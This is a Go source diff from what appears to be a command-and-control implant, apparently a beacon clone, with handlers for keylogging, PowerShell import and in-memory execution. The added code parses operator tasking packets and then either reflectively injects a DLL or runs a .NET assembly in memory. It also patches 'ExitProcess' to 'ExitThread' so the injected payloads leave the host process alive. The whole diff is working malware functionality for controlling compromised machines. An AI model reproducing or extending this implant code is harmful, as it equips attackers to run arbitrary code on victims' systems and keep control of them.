@@ -1,6 +1,8 @@
 package services
 
 import (
+	"bytes"
+	"errors"
 	"io"
 	"main/config"
 	"main/crypt"
@@ -197,13 +199,43 @@ func CmdKeylogger(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdExecuteAssemblyX64(cmdBuf []byte) ([]byte, error) {
-	length := packet.ReadInt(cmdBuf[29:33])
-	index := strings.Index(string(cmdBuf[length+33:]), string([]byte{byte(0), byte(0), byte(77), byte(90), byte(144), byte(0)}))
-	param := string(cmdBuf[length+33 : length+33+uint32(index)])
+	_, _, _, description, data, dll, err := ParseExecAsm(cmdBuf)
+	if err != nil {
+		return nil, errors.New("parameter wrong")
+	}
+	if string(description) != ".NET assembly" { // data is parameter, dll is reflectivedll
+		dll = bytes.ReplaceAll(dll, []byte("ExitProcess"), []byte("ExitThread\x00"))
+		return packet.DllInject(data, dll)
+	}
+	//data is Csharp, dll is environment
+	data = bytes.ReplaceAll(data, []byte("ExitProcess"), []byte("ExitThread\x00"))
+	dataBuf := bytes.NewBuffer(data)
+	data, _ = util.ParseAnArg(dataBuf)
+	dataParam := dataBuf.Bytes()
+	param := string(dataParam)
+
 	param = strings.ReplaceAll(param, "\x00", "")
 	param = strings.Trim(param, " ")
 	params := strings.Split(param, " ")
-	return packet.ExecuteAssembly(cmdBuf[33:length+33], params)
+	return packet.ExecuteAssembly(data, params)
+}
+
+func ParseExecAsm(b []byte) (uint16, uint16, uint32, []byte, []byte, []byte, error) {
+	buf := bytes.NewBuffer(b)
+
+	callbackTypeByte := make([]byte, 2)
+	sleepTimeByte := make([]byte, 2)
+	offset := make([]byte, 4)
+	_, _ = buf.Read(callbackTypeByte)
+	_, _ = buf.Read(sleepTimeByte)
+	_, _ = buf.Read(offset)
+	callBackType := packet.ReadShort(callbackTypeByte)
+	sleepTime := packet.ReadShort(sleepTimeByte)
+	offSet := packet.ReadInt(offset)
+	description, err := util.ParseAnArg(buf)
+	csharp, err := util.ParseAnArg(buf)
+	dll := buf.Bytes()
+	return callBackType, sleepTime, offSet, description, csharp, dll, err
 }
 
 func CmdImportPowershell(cmdBuf []byte) ([]byte, error) {
